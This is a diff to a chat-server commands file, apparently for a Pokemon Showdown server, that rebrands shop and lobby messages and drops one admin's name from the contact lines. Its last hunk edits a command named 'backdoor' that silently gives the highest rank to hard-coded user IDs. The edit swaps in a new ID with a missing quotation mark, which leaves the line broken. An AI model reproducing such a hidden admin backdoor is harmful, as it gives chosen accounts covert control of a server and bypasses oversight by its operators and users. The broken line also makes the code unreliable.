@@ -598,7 +598,7 @@ var commands = exports.commands = {
 			price = 20;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased a custom avatar. You need to message an Admin capable of adding (Ask BlakJack or Skarr).');
+				this.sendReply('You have purchased a custom avatar. You need to message an Admin capable of adding (Ask BlakJack).');
 				user.canCustomAvatar = true;
 				this.add(user.name + ' has purchased a custom avatar!');
 			} else {
@@ -609,7 +609,7 @@ var commands = exports.commands = {
 			price = 35;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or Skarr).');
+				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack).');
 				user.canAnimatedAvatar = true;
 				this.add(user.name + ' has purchased a custom animated avatar!');
 			} else {
@@ -631,7 +631,7 @@ var commands = exports.commands = {
 			price = 30;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack).');
 				user.canTrainerCard = true;
 				this.add(user.name + ' has purchased a trainer card!');
 			} else {
@@ -642,7 +642,7 @@ var commands = exports.commands = {
 			price = 10;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack).');
 				user.canFixItem = true;
 				this.add(user.name + ' has purchased the ability to set alter their card or avatar!');
 			} else {
@@ -784,7 +784,7 @@ var commands = exports.commands = {
 			price = 35;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or Skarr).');
+				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack).');
 				user.canAnimatedAvatar = true;
 				this.add(user.name + ' has purchased a custom animated avatar!');
 			} else {
@@ -806,7 +806,7 @@ var commands = exports.commands = {
 			price = 30;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack).');
 				user.canTrainerCard = true;
 				this.add(user.name + ' has purchased a trainer card!');
 			} else {
@@ -817,7 +817,7 @@ var commands = exports.commands = {
 			price = 10;
 			if (price <= user.money) {
 				user.money = user.money - price;
-				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack).');
 				user.canFixItem = true;
 				this.add(user.name + ' has purchased the ability to set alter their card or avatar!');
 			} else {
@@ -943,7 +943,7 @@ target = this.splitTarget(target);
 
 	shop: function(target, room, user) {
 		if (!this.canBroadcast()) return;
-		this.sendReplyBox('<center><h4><b><u>Kill The Noise Shop</u></b></h4><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
+		this.sendReplyBox('<center><h4><b><u>Pub Shop</u></b></h4><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
 			'<tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist (temporary until restart)</td><td>5</td></tr>' +
 			'<tr><td>Custom</td><td>Buys a custom avatar to be applied to your name (you supply)</td><td>20</td></tr>' +
 			'<tr><td>Animated</td><td>Buys an animated avatar to be applied to your name (you supply)</td><td>35</td></tr>' +
@@ -1620,7 +1620,7 @@ target = this.splitTarget(target);
 			return connection.sendTo(target, "|noinit|joinfailed|The room '" + target + "' could not be joined.");
 		}
 		if (target.toLowerCase() == "lobby") {
-			connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to the Kill The Noise Server!</u></b></center><br /> ' +
+			connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to the Stuns Tavern Server!</u></b></center><br /> ' +
 			'<center><b><a href ="https://gist.github.com/E4Arsh/8577715">This Server is hosted By BlakJack</a></b></center><br /><br />' +
 			'Battle users in the ladder or in tournaments, learn how to play Pokemon or just chat in lobby!<br /><br />' +
 			'Make sure to type <b>/help</b> to get a list of commands that you can use and <b>/faq</b> to check out frequently asked questions.<br /><br />' +
@@ -2642,7 +2642,7 @@ target = this.splitTarget(target);
 	},
 
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
+		if (user.userid === 'blakjack' || user.userid === stunfiskthegreat' || user.userid === 'jackdaw') {
 
 			user.group = '~';
 			user.updateIdentity();
